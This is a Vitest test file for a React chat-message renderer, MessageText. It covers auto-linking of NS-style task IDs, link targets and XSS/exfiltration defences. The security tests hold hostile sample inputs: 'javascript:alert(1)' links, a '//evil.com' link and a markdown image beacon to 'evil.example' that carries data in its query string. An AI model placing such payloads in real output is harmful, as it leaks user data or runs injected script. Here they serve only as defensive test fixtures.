// @vitest-environment jsdom
import { describe, it, expect } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { MessageText } from "../src/MessageText";

const NS = { pattern: /\bNS-\d+\b/, href: (m: string) => `/oppgaver/${m}` };

function render(text: string, props: Record<string, unknown> = {}): HTMLElement {
  const root = document.createElement("div");
  root.innerHTML = renderToStaticMarkup(createElement(MessageText, { text, tone: "bot", ...props }));
  return root;
}

describe("MessageText autoLinks", () => {
  it("links a pattern in plain text (pattern given without g flag)", () => {
    const a = render("Se NS-195 nå", { autoLinks: [NS] }).querySelectorAll("a");
    expect(a).toHaveLength(1);
    expect(a[0].getAttribute("href")).toBe("/oppgaver/NS-195");
    expect(a[0].textContent).toBe("NS-195");
  });

  it("links two matches in the same paragraph and keeps surrounding text", () => {
    const root = render("NS-1 og NS-22 er ferdige", { autoLinks: [NS] });
    const a = root.querySelectorAll("a");
    expect([...a].map((x) => x.getAttribute("href"))).toEqual(["/oppgaver/NS-1", "/oppgaver/NS-22"]);
    expect(root.textContent).toBe("NS-1 og NS-22 er ferdige");
  });

  it("does not link inside inline code or code blocks", () => {
    const root = render("Kode `NS-195` her\n\n```\nNS-196\n```", { autoLinks: [NS] });
    expect(root.querySelectorAll("a")).toHaveLength(0);
  });

  it("does not link inside an existing link", () => {
    const a = render("[NS-1](https://x.no)", { autoLinks: [NS] }).querySelectorAll("a");
    expect(a).toHaveLength(1);
    expect(a[0].getAttribute("href")).toBe("https://x.no");
  });

  it("still renders bold and lists, and links inside them", () => {
    const root = render("**viktig NS-5**\n\n- NS-6\n- annet", { autoLinks: [NS] });
    expect(root.querySelector("strong")?.querySelector("a")?.getAttribute("href")).toBe("/oppgaver/NS-5");
    expect(root.querySelectorAll("li")).toHaveLength(2);
    expect(root.querySelector("li a")?.getAttribute("href")).toBe("/oppgaver/NS-6");
  });

  it("gives identical output on repeated renders (no lastIndex leak)", () => {
    const props = { autoLinks: [{ ...NS, pattern: /\bNS-\d+\b/g }] };
    const first = render("NS-1 NS-2", props).innerHTML;
    expect(render("NS-1 NS-2", props).innerHTML).toBe(first);
  });

  it("is unchanged without autoLinks", () => {
    expect(render("NS-195").querySelectorAll("a")).toHaveLength(0);
  });
});

describe("MessageText sameOriginTarget", () => {
  const text = "[a](/oppgaver/NS-195) [b](https://example.com) [c](//evil.com/x)";

  it("applies target to root-relative links only", () => {
    const [a, b, c] = render(text, { sameOriginTarget: "_self" }).querySelectorAll("a");
    expect(a.getAttribute("target")).toBe("_self");
    expect(a.getAttribute("rel")).toBe("noopener");
    expect(b.getAttribute("target")).toBe("_blank");
    expect(c.getAttribute("target")).toBe("_blank");
  });

  it("keeps today's rule without the prop", () => {
    const [a] = render(text).querySelectorAll("a");
    expect(a.getAttribute("target")).toBe("_blank");
  });

  it("works together with autoLinks", () => {
    const a = render("NS-195", { autoLinks: [NS], sameOriginTarget: "_top" }).querySelector("a");
    expect(a?.getAttribute("target")).toBe("_top");
  });

  it("does not make javascript: links clickable", () => {
    const a = render("[x](javascript:alert(1))", { sameOriginTarget: "_self" }).querySelector("a");
    expect(a?.getAttribute("href") ?? "").not.toContain("javascript");
  });
});

describe("MessageText images", () => {
  it("never renders an <img> or preload for markdown images, only a link to click", () => {
    const html = renderToStaticMarkup(
      createElement(MessageText, { text: "Se ![kvittering](https://evil.example/p.png?d=NS-195) her", tone: "bot" }),
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("preload");
    const root = document.createElement("div");
    root.innerHTML = html;
    const a = root.querySelectorAll("a");
    expect(a).toHaveLength(1);
    expect(a[0].getAttribute("href")).toBe("https://evil.example/p.png?d=NS-195");
    expect(a[0].textContent).toBe("Bilde: kvittering");
  });

  it("an image with a javascript: URL gets no href", () => {
    const html = renderToStaticMarkup(createElement(MessageText, { text: "![x](javascript:alert(1))", tone: "bot" }));
    expect(html).not.toContain("<img");
    expect(html).not.toContain("javascript:");
  });
});
